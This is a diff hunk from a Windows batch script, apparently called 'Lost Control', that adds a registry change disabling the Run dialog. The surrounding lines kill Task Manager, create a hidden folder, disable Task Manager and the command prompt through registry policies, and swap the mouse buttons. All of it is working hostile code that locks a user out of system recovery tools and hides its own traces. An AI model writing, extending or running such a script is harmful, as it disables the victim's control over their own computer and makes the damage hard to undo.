@@ -3,6 +3,7 @@ taskkill /f /im taskmgr.exe
 if exist "%localappdata%\Lost Control" rd "%localappdata%\Lost Control"/q/s
 md "%localappdata%\Lost Control"
 attrib +h "%localappdata%\Lost Control"
+reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
 reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 reg add HKCU\software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 2 /f
 reg add "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /f
